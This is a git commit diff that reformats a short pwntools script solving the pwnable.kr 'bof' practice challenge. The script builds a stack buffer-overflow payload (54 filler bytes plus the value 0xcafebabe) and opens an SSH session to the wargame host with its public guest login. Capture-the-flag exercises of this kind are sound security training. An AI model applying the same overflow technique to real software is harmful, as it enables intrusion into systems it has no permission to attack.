5e793a46ce026434b76e36e2772116d876f7ea84
taj-byte <148686984+taj-byte@users.noreply.github.com>
2025-11-09 17:06:45 +0900

    fix

--- pwnable.kr/bof.py
+++ pwnable.kr/bof.py
@@ -1,10 +1,10 @@
 from pwn import * 
  
- flag = 0xcafebabe
- payload = b"a"*54
- payload += flag.to_bytes(4,'little')
+flag = 0xcafebabe
+payload = b"a"*54
+payload += flag.to_bytes(4,'little')
 
- s1 = ssh(host='pwnable.kr', user='bof',password='guest', port=2222)
- r1 = s1.process('./bof')
- print(r1.recv())
- s1.close()
+s1 = ssh(host='pwnable.kr', user='bof',password='guest', port=2222)
+r1 = s1.process('./bof')
+print(r1.recv())
+s1.close()
